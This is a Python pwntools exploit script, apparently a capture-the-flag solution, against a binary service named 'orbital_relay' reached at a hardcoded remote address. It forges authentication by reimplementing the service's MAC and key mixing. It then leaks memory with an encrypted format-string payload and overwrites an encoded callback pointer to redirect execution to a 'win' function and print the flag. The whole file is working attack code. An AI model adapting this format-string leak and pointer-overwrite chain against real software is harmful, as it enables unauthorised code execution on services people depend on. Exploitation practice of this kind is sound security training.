#!/usr/bin/env python3
from pwn import *
import struct
import sys

context.log_level = 'debug'

def mix32(x):
    x &= 0xFFFFFFFF
    y = ((x << 13) & 0xFFFFFFFF) ^ x
    z = (y >> 17) ^ y
    w = ((z << 5) & 0xFFFFFFFF) ^ z
    return w & 0xFFFFFFFF

def kbyte(key, i):
    val = (key + (i & 0xFFFF) * 0x045D9F3B) & 0xFFFFFFFF
    return mix32(val)

def mac32(data, data_len, cmd_type, subtype, r8_byte):
    sess_val = 0x44434241
    eax = ((r8_byte & 0xFF) << 16) ^ sess_val ^ (subtype & 0xFF) ^ 0x9E3779B9
    eax &= 0xFFFFFFFF
    for i in range(data_len):
        eax = ((eax << 7) | (eax >> 25)) & 0xFFFFFFFF
        eax ^= (data[i] + 0x3D) & 0xFFFFFFFF
    return eax

def send_cmd(io, cmd_type, subtype, payload):
    data_len = len(payload)
    computed_mac = mac32(payload, data_len, cmd_type, subtype, cmd_type)
    hdr = struct.pack('<BBhI', cmd_type, subtype, data_len, computed_mac)
    io.send(hdr + payload)

SESS             = 0x44434241
SESSION_STATE_LOW = 0x28223B24
DWORD_40E0_INIT  = mix32(0x3B152813)

def exploit():
    LOCAL = '--local' in sys.argv
    io = process('./orbital_relay') if LOCAL else remote('20.193.149.152', 1339)

    # 1. Handshake
    io.send(b'SYNCv3?')
    io.recv(4, timeout=10)   # Session ID

    dword_40E0        = DWORD_40E0_INIT
    session_state_low = SESSION_STATE_LOW

    # 2. Auth (chan 3)
    auth_val = mix32(session_state_low ^ SESS) ^ 0x31C3B7A9
    send_cmd(io, 3, 0, struct.pack('<I', auth_val))

    # 3. Set session_state byte4 = 7  (tag 0x22)
    send_cmd(io, 1, 0, bytes([0x22, 0x01, 0xFF]))

    # 4. Write format string into st  (tag 0x10)
    dec_key  = dword_40E0 ^ session_state_low
    fmt_str  = b'%x.%p.%p.'
    encrypted = bytes([b ^ (kbyte(dec_key, i) & 0xFF) for i, b in enumerate(fmt_str)])
    send_cmd(io, 1, 0, bytes([0x10, len(fmt_str)]) + encrypted)

    # 5. Leak via printf  (tag 0x40)
    send_cmd(io, 1, 0, bytes([0x40, 0x00]))
    leak   = b''.join(io.recvuntil(b'.', timeout=5) for _ in range(3))
    parts  = leak.decode().split('.')
    leaked_40E0 = int(parts[0], 16) & 0xFFFFFFFF
    leaked_win  = int(parts[2], 16)
    io.recvline(timeout=2)  # consume newline/separator

    # 6. Compute target cb_enc  =  enc_cb(win_addr)
    target_cb = (leaked_win
                 ^ ((leaked_40E0 << 32) & 0xFFFFFFFFFFFFFFFF)
                 ^ session_state_low
                 ^ 0x9E3779B97F4A7C15) & 0xFFFFFFFFFFFFFFFF

    # 7. Overwrite cb_enc  (tag 0x31)
    send_cmd(io, 1, 0, bytes([0x31, 0x08]) + struct.pack('<Q', target_cb))

    # 8. Trigger win via chan 9
    send_cmd(io, 9, 0, b'')
    flag = io.recvall(timeout=5)
    log.success(f'FLAG: {flag.decode(errors="replace")}')
    io.close()

if __name__ == '__main__':
    exploit()